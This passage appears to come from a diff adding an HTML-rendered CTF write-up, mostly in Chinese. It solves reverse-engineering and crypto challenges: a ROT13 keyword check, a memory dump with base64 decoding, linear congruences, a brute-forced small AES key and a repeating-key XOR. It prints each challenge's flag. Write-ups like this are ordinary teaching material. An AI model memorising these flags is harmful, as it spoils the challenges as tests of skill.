+    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ttk&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;str2&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;compareTo&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Jr_j11y_s1tug_g0_raq_g0_raq_pnml&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;str5&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;compareTo&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;871019511949491089510249103104116951164895101110100951164895101110100959997122121&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+      System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your keyword is correct!&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+      System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your keyword is wrong!&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ttk 凯撒 k=13&lt;/p&gt;
+&lt;p&gt;We_w11l_f1ght_t0_end_t0_end_cazy&lt;/p&gt;
+&lt;p&gt;flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;flag{We_w11l_f1ght_t0_end_t0_end_cazy}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;cute_doge&#34;&gt;cute_doge&lt;/h3&gt;
+&lt;p&gt;运行后dump内存&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 243; 
+			flex-basis: 585px&#34;
+	&gt;
+	&lt;a href=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/cute_doge.png&#34; data-size=&#34;695x285&#34;&gt;
+		&lt;img src=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/cute_doge.png&#34;
+			width=&#34;695&#34;
+			height=&#34;285&#34;
+			srcset=&#34;https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/cute_doge_hu902cad3ca47ad606c3e8a81fa7d05d17_89106_480x0_resize_box_3.png 480w, https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/cute_doge_hu902cad3ca47ad606c3e8a81fa7d05d17_89106_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;解base64&lt;/p&gt;
+&lt;p&gt;ZmxhZ3tDaDFuYV95eWRzX2Nhenl9&lt;/p&gt;
+&lt;p&gt;flag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;flag{Ch1na_yyds_cazy}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
+&lt;h3 id=&#34;linearequations&#34;&gt;LinearEquations&lt;/h3&gt;
+&lt;p&gt;线性同余方程&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;d[0] * b + d[1] * a + c = d[2]
+d[1] * b + d[2] * a + c = d[3]
+d[2] * b + d[3] * a + c = d[4]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以有&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(d[1] - d[0]) * b + (d[2] - d[1]) * a = d[3] - d[2]
+(d[2] - d[1]) * b + (d[3] - d[2]) * a = d[4] - d[3]
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;求解同余方程即可&lt;/p&gt;
+&lt;p&gt;直接放ipython的log了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2626199569775466793&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8922951687182166500&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;454458498974504742&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7289424376539417914&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8673638837300855396&lt;/span&gt;]
+n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10104483468358610819&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;]: left &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (d[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (d[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (d[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (d[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;]: left
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;2071989288624214374&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;]: right &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (d[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (d[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (d[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;]: right
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;220570350959470413&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;]: right &lt;span style=&#34;color:#f92672&#34;&gt;%=&lt;/span&gt; n
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;]: right
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;9883913117399140406&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]: invmod(right, n)
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;9158039860152232368&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;]: invmod(right, n) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; left &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;5490290802446982981&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;]: a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; invmod(right, n) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; left &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;]: n2s(a)
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;]: &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;L1near_E&amp;#39;&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;]: left &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (d[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;]: left &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (d[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (d[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;]: left
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;2594113358272023300&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;]: left &lt;span style=&#34;color:#f92672&#34;&gt;%=&lt;/span&gt; n
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;]: left
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;2594113358272023300&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;]: right &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;]: left &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; invmod(right, n)
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;22730265397535795623381317872033942100&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;]: b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; left &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; invmod(right, n) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;]: b
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;8175498372211240502&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;]: n2s(b)
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;]: &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;qu4t1on6&amp;#39;&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;]: n2s(a)
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;]: &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;L1near_E&amp;#39;&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;]: n2s(b)
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;]: &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;qu4t1on6&amp;#39;&lt;/span&gt;
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;]: c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; d[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;]: c &lt;span style=&#34;color:#f92672&#34;&gt;%=&lt;/span&gt; n
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;]: n2s(c)
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;]: &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_1s_34sy&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;no_can_no_bb&#34;&gt;no_can_no_bb&lt;/h3&gt;
+&lt;p&gt;key 最大是 &lt;code&gt;1 &amp;lt;&amp;lt; 20&lt;/code&gt;，可以直接爆破&lt;/p&gt;
+&lt;p&gt;如果解密后开头为 cazy 说明正确&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; AES
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pad&lt;/span&gt;(m):
+    tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;(len(m)&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; bytes([tmp &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(tmp)])
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt;(m,key):
+    aes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key,AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_ECB)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encrypt(m)
+
+c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x9d\x18&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;K&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x84&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x18\xad&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc6\xfc\xec\xfe\x14\x0b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_T&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe3\x1b\x03&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Q&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x96&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x9e\xb8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;MQ&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd5\xc3\x1c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
+    key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pad(long_to_bytes(i))
+    aes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_ECB)
+    flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(c)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; flag[:&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cazy{&amp;#39;&lt;/span&gt;:
+        print (flag)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;cazy{n0_c4n,bb?n0p3!}\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;no_cry_no_can&#34;&gt;no_cry_no_can&lt;/h3&gt;
+&lt;p&gt;福纳姆密码，密钥长度为 5，并且已知 flag 开头为 &lt;code&gt;cazy{&lt;/code&gt;，所以直接解&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+front &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cazy{&amp;#39;&lt;/span&gt;
+cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;pH&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x86\x1a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;&amp;#34;m&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xce\x12\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;pm&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x97&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;U1uA&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcf\x0c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:NP&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcf\x18&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;~l&amp;#39;&lt;/span&gt;
+key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes([f &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; c &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; f, c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(front, cipher)])
+key &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c, k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(cipher, key):
+    print (chr(c &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; k), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+print()
+&lt;span style=&#34;color:#75715e&#34;&gt;#cazy{y3_1s_a_h4nds0me_b0y!}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;math&#34;&gt;math&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; math &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; gcd
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; gmpy2 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; invert, is_prime
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; long_to_bytes &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; n2s
+
+invq &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3&lt;/span&gt;
+e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10005&lt;/span&gt;
